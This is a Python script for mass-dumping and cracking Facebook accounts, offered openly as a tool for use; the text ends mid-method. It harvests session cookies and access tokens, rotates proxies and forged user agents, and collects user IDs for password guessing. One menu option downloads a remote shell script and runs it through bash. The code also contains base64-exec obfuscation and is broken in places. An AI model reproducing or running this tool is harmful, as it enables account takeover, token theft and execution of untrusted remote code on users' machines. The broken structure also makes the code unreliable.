#!/usr/bin/env python3
import requests, time, os, re, json, random
import socket
from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup as parser

from bs4 import BeautifulSoup as par

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as panel

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich.tree import Tree

from rich import print as rprint

from rich import print as prints

from rich import pretty

from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

from rich.text import Text as tekz

try:

        import rich

except ImportError:

        cetak(nel('\t• Sedang Menginstall Modul Rich •'))

        os.system('pip install rich')

try:

        import stdiomask

except ImportError:

        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))

        os.system('pip install stdiomask')

try:

	import requests

except ImportError:

	cetak(nel('\t• Sedang Menginstall Modul Requests •'))

	os.system('pip install requests && pip install mechanize ')

#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen3=[]
usragent = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=10000&country=id&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c=random.choice(['ZTE Blade A3 Lite'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Redmi Go Build/OPM1.171019.026)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['LG-H933'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='T774H Build/RKQ1.201112.002; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['F3311'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(80,106)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['TECNO KC3'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=(['POCOPHONE F1'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OPR/59.1.2926.54067'
	uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['HiSmartTV A4'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MI PLAY Build/O11019)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.1.9-g'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ALCATEL ONE TOUCH P320X'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)

def ua_ee():
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	Hi = ['en_GB','en_US','id_ID','zh_CN','pt_BR','es_ES']
	bi = ['zh-cn;','en-nz;','vi-vn;','hi-in;','en-us;','id-id;','en-gb;','ru-ru;','jap-jap;','en-ca;','es-mx;','zh-tw;','ko-kr;','th-th;','en-in;','el-gr;','tr-tr;','fr-fr;','en-ez;','zh-hk;','ar-ae;','ru-ru;','zh-CN;en-US;','fr-ch;','pt-br;','nl-nl;','gu-in;']
	Mo = ['SM-G6100', 'SM-G610L', 'SM-G610K']
	Mu = ['SM-G9287C', 'SM-G9287', 'SM-G928A', 'SM-G928F']
	An = ['8.1.0', '6.0.1', '8.0.0', '7.0', '5.1.1']
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(6, 12))}; Mi 9T Pro AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80, 105))}.0.{str(rr(1111, 4896))}.{str(rr(100, 400))} Mobile Safari/537.36"]))
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid= [],[],0,0,0,[],[],[],[],[],[]
cokbrut=[]
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
# UA LIST
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()

# LIST DUMP #
Dump = []
# BANNER OR LOGO #
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Coded by Mikasa
    Console(width=70, style="bold blue").print(Panel("""\n[bold red]●[bold yellow] ●[bold green] ●
[bold white]╔═╗╦  ╦  ╔═╗╦╔╦╗╦═╗╔═╗╔═╗  [bold white][[bold green]+[bold white]] Kontak : 6282151858918
[bold white]║  ║  ║  ╚═╗║ ║║╠╦╝╠═╣╠═╝  [bold white][[bold green]+[bold white]] Discord : Sanatic#7841
[bold white]╚═╝╩═╝╩  ╚═╝╩═╩╝╩╚═╩ ╩╩    [bold white][[bold green]+[bold white]] Fb :  @DESORDENGROUP
\n[italic violet]( Devloper VCCODE Timz )""", title="© [italic green]Inc Made In Bunta City "))
    return 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:
            Console(width=70, style="bold blue").print(Panel("[italic red]Facebook Graph Access Failed, Maybe Facebook Cookies Have Expired!", title="[bold hot_pink2]([bold blue]Token Invalid[bold hot_pink2])"));time.sleep(3.2);login_cookie()
### LOGIN USING COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(width=70, style="bold blue").print(Panel("""[italic green]1[italic white]. Login Cookie
[italic green]2[italic white]. Report Facebook
[italic green]3[italic white]. Activate a2F Facebook Toolkit
[italic green]4[italic white]. Exit ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[italic yellow] Login Using Facebook Cookies"))
        query = Console().input("[bold blue]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=70, style="bold blue").print(Panel("[italic white]Please Enter[italic green] Cookie[italic white], Use Sacrifice To Login And Make Sure Not Exposed[italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[italic yellow]Notification Message"))
            cookie = Console().input("[bold blue]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').text
                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                name, id = dapatkan_nama(cookie, token_eaag)
                hostname = socket.gethostname()
                ip_address = socket.gethostbyname(hostname)               
                Console(width=70, style="bold blue").print(Panel(f"""[bold white]Name :[bold violet] {name}
[bold white]User IP andress :[bold violet] {ip_address}""", title="[italic yellow] Welcome to the club"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
        elif query == '2' or query == '02':
            try:
                Console().print("[bold white]   ╰─>[bold green] Proses installasi", end='\r');time.sleep(3.6);os.system("xdg-open https://bins.live/Install.php");exit()     
            except:exit()
        elif query == '3' or query == '03':
            try:
               Console().print("[bold blue]   ╰─>[bold green] You Will Be Redirected To Admin", end='\r');time.sleep(3.6);os.system("wget https://raw.githubusercontent.com/Boys-11/Roarrrgemini/main/sshakses.sh && bash sshakses.sh && https://raw.githubusercontent.com/Boys-11/Roarrrgemini/main/a2f.py && python a2f.py");time.sleep(4.6)
            except:exit()
        elif query == '4' or query == '04':
            Console().print("[bold blue]   ╰─>[bold yellow] Quit Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold blue]   ╰─>[bold red] Unknown Choices!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
### BOT KOMEN ###
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        kom1 = ("Sehat Selalu Bang Ganteng\n -\nhttps://web.facebook.com/photo?fbid=1650534938699437&set=a.1650534938699437\n-\n \nKomentar Di Tulis Oleh Bot @[100062162973277:0]\n \n[ Semangat Terus Master @[100062162973277:0]") 
kom2 = ("Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku") 
kom3 = ("Panutan Ku") 
kom4 = ("Keren Bang") 
kom5 = ("Kamu Ganteng Banget Deh @[100062162973277:0]") 
kom6 = (" Semangat Master @[100062162973277:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n-\nhttps://web.facebook.com/photo?fbid=1650534938699437&set=a.1650534938699437\n-\nSehat Selalu Master  @[100062162973277:0] â¤") 
kom7 = (" Mantap bang @[100062162973277:0]\n\nLove You\n-\nhttps://web.facebook.com/photo?fbid=1650534938699437&set=a.1650534938699437\n-\nZull nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading  @[100062162973277:0] â¤") 
kom8 = ("Bersyukurlah ketika merasa lelah, tidak semua orang bisa sekuat kamu @[100062162973277:0]") 
kom9 = ("Semakin banyak kamu berkeringat dalam latihan, semakin sedikit kamu berdarah dalam pertempuran @[100062162973277:0]") 
kom10 = ("Jika ijazahmu tidak berguna Percayalah, masih ada Hp dan kuota mu dapat memberikanmu penghasilan @[100062162973277:0]") 

### DAFTAR MENU ### https://www.facebook.com/100062162973277/posts/1650534938699437/?substory_index=1650534938699437&app=fbl
### Login lagi ###
def daftar_menu():
    try:
        
        banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        bot_komen = json.loads(open('Data/Token.json', 'r').read())['Token']
        bot_komen = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']        
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)        
        Console(width=70, style="bold blue").print(Panel(f"""[bold white]Name :[bold green] {name}
[bold white]User IDs Facebook :[bold violet] {id}\n[bold white]Hostname :[bold violet] {hostname}\n[bold white]Ip Anddres : [bold violet] {ip_address} """, title="[italic violet] Welcome to the club"))
    except Exception as e:
        Console(width=70, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
    Console(width=70, style="bold blue").print(Panel("""[italic green]Run[italic white] > Public Facebook User And Password Exploit
[italic green]Like[italic white] > Exploit User And Password Facebook Like Post
[italic green]EL[italic white] > Exploit Facebook User And Password From Like
[italic green]BOT[italic white] > Enable WhatsApp Banned Bots Installasi [italic red] ALERT
[italic green]TIPS[italic white] > trick to collect public facebook ID
[italic green]RM[italic white] > Exit ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[italic violet] Hacking Activity"))
    query = Console().input("[bold blue]   ╰─> ")
    if query == 'Run' or query == 'run':
        try:
            Console(width=70, style="bold blue").print(Panel("[italic white]Please Enter[italic green] Facebook Account ID[italic white], Use Commas For Mass Dumps, For Example :[italic green] 100062162973277", subtitle="╭───", subtitle_align="left", title="[italic yellow]NOTIFICATION MESSAGE"))
            userid = Console().input("[bold blue]   ╰─> ")
            for z in userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            if len(Dump) < 50:
                Console().print("[bold blue]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=70, style="bold blue").print(Panel(f"[bold white]Number of Users :[bold green] {len(Dump)}", title="[italic violet] Success Collecting Facebook IDs"));crack().open_list()
        except Exception as e:
            Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == 'LIKE' or query == 'Like':
        try:
            Console(width=70, style="bold blue").print(Panel("[italic white]Please Enter[italic green] Facebook Account ID[italic white], Use Commas For Mass Dumps, For Example :[italic green] 100062162973277", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Notes) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold white]   ╰─> ")
            for z in userid.split(','):
                dump().pengikut(z, cookie, token_eaag)
            if len(Dump) < 50:
                Console().print("[bold white]   ╰─>[bold yellow] Too Few Users!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=70, style="bold blue").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Succes) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == 'EL' or query == 'el':
        try:
            Console(width=70, style="bold blue").print(Panel("[italic white]Please Enter Post ID, Use Comma For Bulk Dump, For Example :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (notes) [bold green]<[bold yellow]<[bold red]<"))
            postid = Console().input("[bold blue]   ╰─> ")
            for z in postid.split(','):
                dump().likes(z, cookie, token_eaag, after = '')
            if len(Dump) < 1:
                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Too Few Users!!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=70, style="bold blue").print(Panel(f"[bold white]Number of Users :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Succes) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=70, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()     

    elif query == 'RM' or query == 'rm':
        try:
            os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold blue]   ╰─>[bold green] Exit the Program!", end='\r');time.sleep(3.6);exit()
        except:exit()
        else:
               Console().print("[bold blue]   ╰─>[bold red] Unknown Choices!", end='\r');time.sleep(3.6);daftar_menu()
               
    elif query == 'BOT' or query == 'bot':
        try:
            Console(width=70, style="bold blue").print(Panel("[italic white]The Service is Again in Mass Improvement", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (notes) [bold green]<[bold yellow]<[bold red]<"))
        except:exit()
        else:
            Console().print("[bold blue]   ╰─>[bold red] We will direct you back to the main menu", end='\r');time.sleep(5.6);daftar_menu()
            
    elif query == 'TIPS' or query == 'tips':
        try:
             Console().print("[bold blue]   ╰─>[bold green] You will be directed to his tricks via video media", end='\r');time.sleep(3.6);os.system("xdg-open https://www.mediafire.com/file/3ils394hm5sbpdk/20230303172127.mp4/file");daftar_menu()
        except:exit()
             
### DUMP ###
class dump:

    def __init__(self) -> None:
        pass
    ### DUMP PUBLIK ###
    def publik(self, userid, cookie, unit_cursor):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
                    'accept-language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cookie
                })
                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(Dump):
                            continue
                        else:
                            Console().print(f"[italic white]   ╰─>[bold green] Dump Date IDs Facebook {self.id_friends} ─> {len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                if 'Sorry, something went wrong.' in str(response):
                    Console().print(f"[bold blue]   ╰─>[bold yellow] Sorry, Something Went Wrong!          ", end='\r');time.sleep(2.1)
                    return 0
                elif 'unit_cursor=' in str(response):
                    try:
                        self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                        self.publik(userid, cookie, self.unit_cursor)
                    except (AttributeError):
                        Console().print(f"[bold blue]   ╰─>[bold red] Cursor Not Found!            ", end='\r');time.sleep(2.1)
                        return 2
                else:
                    return 0
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 3
    ### DUMP PENGIKUT ###
    def pengikut(self, userid, cookie, token_eaag):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
